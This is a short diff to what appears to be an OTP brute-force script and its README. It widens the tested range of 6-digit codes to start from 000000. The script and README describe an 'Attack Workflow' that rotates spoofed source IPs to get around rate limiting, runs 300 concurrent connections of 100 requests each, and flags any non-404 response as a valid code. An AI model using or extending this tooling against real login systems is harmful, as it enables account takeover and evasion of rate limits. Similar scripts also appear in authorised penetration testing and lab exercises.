@@ -38,7 +38,7 @@ def queueRequests(target, wordlists):
     # Initialize IP counter (starts at 1.1.1.1)
     ip_parts = [1, 1, 1, 1]
 
-    for otp in range(310000, 999999):  # 000000 to 999999
+    for otp in range(000000, 999999):  # 000000 to 999999
         # Format current IP
         current_ip = "%d.%d.%d.%d" % tuple(ip_parts)
         
@@ -80,7 +80,7 @@ The script generates requests with:
 ### Attack Workflow
 
 1. **IP Rotation**: Cycles through IPs from 1.1.1.1 to 255.255.255.255
-2. **OTP Generation**: Tests all 6-digit combinations from 310000 upwards
+2. **OTP Generation**: Tests all 6-digit combinations from 000000 upwards
 3. **Concurrent Execution**: 300 parallel connections × 100 requests each
 4. **Response Handling**: Any non-404 response is flagged as potentially valid
 ### Important Notes
